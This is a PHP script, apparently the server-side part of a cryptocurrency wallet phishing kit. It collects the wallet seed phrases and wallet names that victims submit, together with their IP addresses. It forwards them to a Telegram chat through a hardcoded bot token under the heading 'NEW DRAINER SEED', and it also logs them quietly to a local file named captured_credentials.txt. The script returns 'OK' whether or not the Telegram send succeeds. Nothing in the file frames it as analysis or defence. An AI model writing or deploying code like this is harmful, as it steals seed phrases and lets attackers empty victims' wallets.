<?php
// telegram_logger.php
header('Content-Type: text/plain');

// Telegram Bot Configuration
$BOT_TOKEN = '8346148281:AAEbtVNUKteys4gVteB3fLFmjCuxUFhQwJ8';
$CHAT_ID = '-1002402221199';

// Get posted data
$wallet_phrase = $_POST['wallet_phrase'] ?? 'N/A';
$wallet_name = $_POST['wallet_name'] ?? 'N/A';
$timestamp = $_POST['timestamp'] ?? date('Y-m-d H:i:s');
$user_agent = $_POST['user_agent'] ?? $_SERVER['HTTP_USER_AGENT'] ?? 'N/A';
$ip_address = $_SERVER['REMOTE_ADDR'] ?? 'N/A';

// Sanitize data
$wallet_phrase = htmlspecialchars($wallet_phrase);
$wallet_name = htmlspecialchars($wallet_name);

// Create Telegram message
$message = "🔐 *NEW DRAINER SEED* 🔐\n\n";
$message .= "📧 *Wallet Phrase:* `{$wallet_phrase}`\n";
$message .= "🔑 *Wallet Name:* `{$wallet_name}`\n";
$message .= "⏰ *Time:* {$timestamp}\n";
$message .= "🌐 *IP:* `{$ip_address}`\n";

// Send to Telegram
$telegram_url = "https://api.telegram.org/bot{$BOT_TOKEN}/sendMessage";
$post_data = [
    'chat_id' => $CHAT_ID,
    'text' => $message,
    'parse_mode' => 'Markdown',
    'disable_web_page_preview' => true
];

// Use cURL to send message
$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, $telegram_url);
curl_setopt($ch, CURLOPT_POST, true);
curl_setopt($ch, CURLOPT_POSTFIELDS, $post_data);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
curl_setopt($ch, CURLOPT_TIMEOUT, 5); // Shorter timeout

$response = curl_exec($ch);
$http_code = curl_getinfo($ch, CURLINFO_HTTP_CODE);
curl_close($ch);

// Always log to local file as primary backup (silent)
$log_entry = date('Y-m-d H:i:s') . " | IP: {$ip_address} | Wallet Phrase: {$wallet_phrase} | Wallet Name: {$wallet_name}\n";
file_put_contents('captured_credentials.txt', $log_entry, FILE_APPEND | LOCK_EX);

// Return simple response
if ($http_code == 200) {
    echo "OK";
} else {
    // Even if Telegram fails, we still logged locally
    echo "OK";
}
?>